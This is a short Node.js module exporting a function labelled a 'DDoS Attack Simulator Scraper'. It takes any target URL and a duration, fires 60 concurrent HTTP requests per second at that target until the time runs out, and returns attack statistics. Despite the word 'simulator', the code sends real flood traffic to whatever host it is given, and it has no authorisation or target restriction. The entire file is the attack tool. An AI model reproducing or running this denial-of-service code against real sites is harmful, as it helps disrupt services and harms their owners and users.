const fetch = require('node-fetch');

/**
 * DDoS Attack Simulator Scraper
 * @param {string} target - Target URL
 * @param {number} duration - Attack duration in seconds
 * @returns {Promise<object>} Attack results with statistics
 */
async function ddosScraper(target, duration) {
    // Input validation
    if (!target || !duration) {
        return {
            error: true,
            message: 'Missing target or duration parameter'
        };
    }

    if (isNaN(duration) || duration <= 0) {
        return {
            error: true,
            message: 'Duration must be a positive number'
        };
    }

    // Add http:// if missing
    if (!target.startsWith('http')) {
        target = 'http://' + target;
    }

    let requestsSent = 0;
    let successfulRequests = 0;
    let failedRequests = 0;
    const startTime = Date.now();

    // Start attack
    const attackInterval = setInterval(async () => {
        try {
            const requests = [];
            
            // Send 60 concurrent requests
            for (let i = 0; i < 60; i++) {
                requests.push(
                    fetch(target)
                        .then(() => successfulRequests++)
                        .catch(() => failedRequests++)
                        .finally(() => requestsSent++)
                );
            }

            await Promise.all(requests);
        } catch (e) {
            console.error('Error during attack:', e);
        }
    }, 1000);

    // Stop after duration
    setTimeout(() => {
        clearInterval(attackInterval);
    }, duration * 1000);

    // Return attack statistics
    return new Promise(resolve => {
        setTimeout(() => {
            const endTime = Date.now();
            const attackDuration = (endTime - startTime) / 1000;
            
            resolve({
                status: 'completed',
                target: target,
                duration: attackDuration.toFixed(2) + 's',
                statistics: {
                    totalRequests: requestsSent,
                    successRate: ((successfulRequests / requestsSent) * 100 || 0).toFixed(2) + '%',
                    requestsPerSecond: (requestsSent / attackDuration).toFixed(2),
                    successCount: successfulRequests,
                    failureCount: failedRequests
                },
                rawData: {
                    startTimestamp: startTime,
                    endTimestamp: endTime,
                    method: 'NINJA'
                }
            });
        }, duration * 1000 + 1000); // Extra second to ensure cleanup
    });
}

module.exports = ddosScraper;
